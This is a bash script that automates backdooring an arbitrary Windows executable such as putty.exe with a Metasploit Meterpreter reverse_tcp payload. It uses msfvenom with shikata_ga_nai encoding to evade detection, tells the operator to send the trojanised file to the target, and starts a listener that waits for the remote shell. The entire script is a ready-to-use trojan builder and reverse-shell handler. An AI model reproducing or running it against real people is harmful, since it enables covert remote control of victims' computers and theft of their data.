#!/bin/bash
#
# It's to create a EXE backdoor with ANY EXE file
# Then, when the target execute the EXE file, you'll have a meterpreter connection
#
# Gabriel Richter <gabrielrih@gmail.com>
# Last Modification: Thu Jan 26 21:41:00 BRST 2017
#
# Reference: https://www.offensive-security.com/metasploit-unleashed/backdooring-exe-files/
#


# CHANGELOG.
# v1     	Basic functions

# USAGE
USE="Usage: $0 [EXEToChange] [backdoorEXE] [lhost] [lport]

[Parameters]
EXEToChange	Original EXE to changeNetwork (Eg. putty.exe)
backdoorEXE	New EXE name file with backdoor (Eg. puttyX.exe)
lhost           Your IP Address
lport           Your port connection

Example:	$0 putty.exe puttyX.exe 10.1.1.227 3000"

# Checking parameters number
if [ $# != 4 ]
then
	echo "$USE"
	exit 1
fi

# Parameters
EXEToChange=$1
backdoorEXE=$2
lhost=$3
lport=$4

# Modifying EXE and putting a backdoor on it
msfvenom -a x86 --platform windows -x $EXEToChange -p windows/meterpreter/reverse_tcp lhost=$lhost lport=$lport -e x86/shikata_ga_nai -i 3 -b "\x00" -f exe -k -o $backdoorEXE

# Show message
echo "NOW! YOU MUST SEND THE NEW EXE FILE TO THE TARGET. THEN PRESS ENTER TO CONTINUE."
read press
echo "Please, wait..."

# Create RC file
echo "use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST $lhost
set LPORT $lport
run" > reverse_tcp.rc

# Start metasploit and while target to execute the EXE file
msfconsole -q -r reverse_tcp.rc

exit 0
